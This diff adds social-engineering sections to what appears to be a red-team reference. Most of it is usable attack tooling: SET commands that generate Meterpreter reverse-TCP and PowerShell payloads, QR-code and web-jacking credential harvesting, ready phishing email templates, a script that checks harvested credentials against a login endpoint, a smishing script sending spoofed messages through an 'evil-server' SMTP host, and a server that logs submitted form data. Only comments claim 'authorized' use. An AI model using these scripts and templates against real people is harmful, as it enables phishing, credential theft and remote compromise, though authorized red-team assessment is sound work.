@@ -1403,3 +1403,243 @@ RED FLAGS TO AVOID:
 - Requesting actions outside normal business processes
 EOF
 ```
+
+---
+
+## 14. Social Engineering Toolkit Advanced
+
+### SET Payload Generation
+
+```bash
+# Generate payloads using SET for authorized testing
+sudo setoolkit
+# 1) Social-Engineering Attacks
+# 4) Create a Payload and Listener
+# 2) Meterpreter (Reverse TCP)
+# Set LHOST=attacker_ip LPORT=443
+
+# SET PowerShell payload generation (command line)
+sudo setoolkit --select 1 --payload 4 --lhost 10.0.0.1 --lport 443
+
+# SET QRCode attack vector for physical deployment
+sudo setoolkit
+# 1) Social-Engineering Attacks
+# 8) QRCode Generator Attack Vector
+# Enter URL: https://phish.spoofed-domain.com/secure-verify
+# Output: QR code image for printing on physical media
+```
+
+### SET Web Jacking Attack
+
+```bash
+# SET Web Jacking creates a fake update notification overlay
+sudo setoolkit
+# 1) Social-Engineering Attacks
+# 2) Website Attack Vectors
+# 5) Web Jacking Attack Method
+# Clone URL: https://target-company.com/portal
+# The attack shows "Please update your browser" overlay
+# When target clicks update, credentials are harvested
+```
+
+---
+
+## 15. Phishing Email Template Library
+
+### Multi-Scenario Email Templates
+
+```python
+#!/usr/bin/env python3
+"""Generate context-aware phishing email templates for authorized assessments."""
+import json
+
+TEMPLATES = {
+    "password_expiry": {
+        "subject": "[Action Required] Password Expiration in {hours} Hours",
+        "preheader": "Your corporate account password expires soon",
+        "body_html": """
+        <p>Dear {first_name},</p>
+        <p>According to our security policy, your password will expire on <strong>{date}</strong>.
+        To avoid account lockout, please update your credentials immediately:</p>
+        <p><a href="{phish_url}" style="background:#0078d4;color:white;padding:10px 20px;">
+        Update Password Now</a></p>
+        <p style="color:#666;font-size:12px;">IT Security Team | {company_name}<br>
+        Ticket Reference: SEC-{ticket_id}</p>""",
+        "channel": "email",
+        "urgency": "high"
+    },
+    "mfa_bypass": {
+        "subject": "Security Alert: New Device Sign-In Detected",
+        "preheader": "Unrecognized device attempted to access your account",
+        "body_html": """
+        <p>Hi {first_name},</p>
+        <p>We detected a sign-in attempt from an unrecognized device:</p>
+        <ul>
+          <li>Location: {fake_city}, {fake_country}</li>
+          <li>Device: {fake_device}</li>
+          <li>Time: {timestamp}</li>
+        </ul>
+        <p>If this was not you, please secure your account immediately:</p>
+        <p><a href="{phish_url}">Review Activity & Secure Account</a></p>
+        <p style="color:#666;font-size:12px;">Security Notification | {company_name}</p>""",
+        "channel": "email",
+        "urgency": "critical"
+    }
+}
+
+def generate_template(template_id, target_info):
+    template = TEMPLATES[template_id]
+    rendered = template["body_html"].format(**target_info)
+    return {"subject": template["subject"].format(**target_info), "body": rendered}
+
+# Example usage
+result = generate_template("mfa_bypass", {
+    "first_name": "John", "fake_city": "Moscow",
+    "fake_country": "Russia", "fake_device": "Windows PC",
+    "timestamp": "2026-05-31 03:14", "phish_url": "https://phish.example.com/verify",
+    "company_name": "Target Corp", "ticket_id": "86753"
+})
+print(json.dumps(result, indent=2))
+```
+
+---
+
+## 16. Credential Harvesting Automation
+
+### Mass Credential Validator
+
+```bash
+# Verify harvested credentials against target authentication endpoint
+# Only use during authorized engagements
+#!/bin/bash
+CREDS_FILE="harvested_credentials.csv"
+ENDPOINT="https://target-company.com/api/v1/auth"
+
+echo "email,password,status" > validated_creds.csv
+while IFS=',' read -r email password; do
+  [[ "$email" == "email" ]] && continue
+  
+  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
+    -X POST "$ENDPOINT" \
+    -H "Content-Type: application/json" \
+    -d "{\"email\":\"$email\",\"password\":\"$password\"}")
+  
+  if [ "$RESPONSE" = "200" ]; then
+    echo "$email,$password,VALID" >> validated_creds.csv
+  elif [ "$RESPONSE" = "401" ]; then
+    echo "$email,$password,INVALID" >> validated_creds.csv
+  else
+    echo "$email,$password,ERROR_$RESPONSE" >> validated_creds.csv
+  fi
+  sleep 2  # Rate limiting
+done < "$CREDS_FILE"
+
+VALID_COUNT=$(grep ",VALID" validated_creds.csv | wc -l)
+TOTAL_COUNT=$(($(wc -l < validated_creds.csv) - 1))
+echo "[+] Valid credentials: $VALID_COUNT / $TOTAL_COUNT"
+```
+
+---
+
+## 17. Smishing Infrastructure
+
+### SMS Gateway Integration
+
+```bash
+# Set up smishing campaign using email-to-SMS gateway
+# Common carrier gateways
+declare -A CARRIER_GATEWAYS=(
+  ["att"]="txt.att.net"
+  ["verizon"]="vtext.com"
+  ["tmobile"]="tmomail.net"
+  ["sprint"]="messaging.sprintpcs.com"
+)
+
+# Send smishing via email-to-SMS
+for phone in $(cat targets_phones.txt); do
+  for carrier in "${!CARRIER_GATEWAYS[@]}"; do
+    sendemail -f "security@spoofed-domain.com" \
+      -t "${phone}@${CARRIER_GATEWAYS[$carrier]}" \
+      -u "Security Alert" \
+      -m "[IT Security] Unusual sign-in detected. Verify: https://phish.spoofed-domain.com/verify?ref=${phone}" \
+      -s smtp.evil-server.com:587 -xu user -xp pass -o tls=yes 2>/dev/null && break
+  done
+done
+```
+
+### Smishing Campaign Tracking
+
+```python
+#!/usr/bin/env python3
+"""Track smishing campaign delivery and interaction rates."""
+import json
+from datetime import datetime
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+campaign_data = {"sent": 0, "clicked": 0, "submitted": 0, "targets": []}
+
+class SmishingTracker(BaseHTTPRequestHandler):
+    def do_GET(self):
+        campaign_data["clicked"] += 1
+        target = self.path.split("ref=")[-1] if "ref=" in self.path else "unknown"
+        campaign_data["targets"].append({
+            "phone": target, "action": "clicked",
+            "timestamp": datetime.now().isoformat(), "ip": self.client_address[0]
+        })
+        # Redirect to real site
+        self.send_response(302)
+        self.send_header("Location", "https://real-target.com/verify")
+        self.end_headers()
+
+    def do_POST(self):
+        length = int(self.headers.get("Content-Length", 0))
+        body = self.rfile.read(length).decode()
+        campaign_data["submitted"] += 1
+        campaign_data["targets"].append({
+            "action": "submitted", "data": body,
+            "timestamp": datetime.now().isoformat()
+        })
+        self.send_response(200)
+        self.end_headers()
+
+print(f"[Tracker] Sent: {campaign_data['sent']} | Clicked: {campaign_data['clicked']} | Submitted: {campaign_data['submitted']}")
+HTTPServer(("0.0.0.0", 8080), SmishingTracker).serve_forever()
+```
+
+---
+
+## 18. Social Engineering Report Generator
+
+### Campaign Metrics and Reporting
+
+```bash
+#!/bin/bash
+# Generate social engineering campaign report from GoPhish API
+GOPHISH_URL="https://gophish-server:3333"
+API_KEY="YOUR_API_KEY"
+CAMPAIGN_ID=$1
+
+# Fetch campaign summary
+curl -s "$GOPHISH_URL/api/campaigns/$CAMPAIGN_ID" \
+  -H "Authorization: $API_KEY" | python3 -c "
+import json, sys
+data = json.load(sys.stdin)
+results = data.get('results', [])
+total = len(results)
+sent = sum(1 for r in results if r.get('status') == 'Sent')
+opened = sum(1 for r in results if 'Opened' in r.get('status', ''))
+clicked = sum(1 for r in results if 'Clicked' in r.get('status', ''))
+submitted = sum(1 for r in results if 'Submitted' in r.get('status', ''))
+reported = sum(1 for r in results if 'Reported' in r.get('status', ''))
+
+print('=== Social Engineering Campaign Report ===')
+print(f'Total Targets:    {total}')
+print(f'Emails Sent:      {sent}')
+print(f'Emails Opened:    {opened} ({opened/total*100:.1f}%)')
+print(f'Links Clicked:    {clicked} ({clicked/total*100:.1f}%)')
+print(f'Credentials:      {submitted} ({submitted/total*100:.1f}%)')
+print(f'Reported:         {reported} ({reported/total*100:.1f}%)')
+print(f'Click-Through Rate: {clicked/sent*100:.1f}%' if sent else 'N/A')
+print(f'Credential Rate:    {submitted/sent*100:.1f}%' if sent else 'N/A')
+"
+```
